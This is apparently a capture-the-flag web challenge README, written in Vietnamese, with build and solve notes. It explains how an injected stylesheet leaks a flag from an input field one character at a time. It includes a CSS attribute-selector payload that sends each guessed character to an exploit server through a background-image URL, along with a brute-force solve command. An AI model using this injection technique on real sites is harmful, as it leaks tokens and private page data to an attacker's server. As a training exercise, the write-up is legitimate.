# Web-Chall

# Build 
./docker-build.sh

# Ý tưởng
- inject file shell.css từ server exploit

# Cách giải
- Do trong file flag.html (hint nằm tại index.html) có thẻ link với server exploit, mục đích lấy được flag nằm tại thẻ input với name=flag và value là flag
- Payload trong file shell.css
> `input[name=flag][value^="F"] {background-image: url("ip?flag=F");}`
- Server kiểm tra trong thẻ input với name=flag và value được so khớp kí tự brute với kí tự trong input, khi so khớp đúng sẽ gọi đến server explot trả về kí tự đúng
> `python solve.py "F" "server-exp"`